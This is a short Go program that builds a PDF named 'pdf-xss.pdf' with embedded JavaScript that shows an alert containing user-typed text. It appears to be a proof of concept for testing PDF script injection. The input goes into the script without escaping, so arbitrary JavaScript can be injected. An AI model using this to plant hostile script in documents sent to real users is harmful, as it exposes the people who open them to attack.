package main

import (
	"fmt"
	"os"

	"github.com/jung-kurt/gofpdf"
)

func main() {
	// Create a new PDF document
	pdf := gofpdf.New("P", "mm", "A4", "")

	// User input
	var userInput string
	fmt.Print("Enter content for alert: ")
	fmt.Scanln(&userInput)

	// JavaScript code to display alert with user input
	jsCode := fmt.Sprintf(`app.alert('%s');`, userInput)

	// Add JavaScript to the PDF
	pdf.SetJavascript(jsCode)

	// Add a page
	pdf.AddPage()

	// Save PDF to file
	err := pdf.OutputFileAndClose("pdf-xss.pdf")
	if err != nil {
		fmt.Println("Error:", err)
		os.Exit(1)
	}

	fmt.Println("PDF with JavaScript alert created successfully!")
}
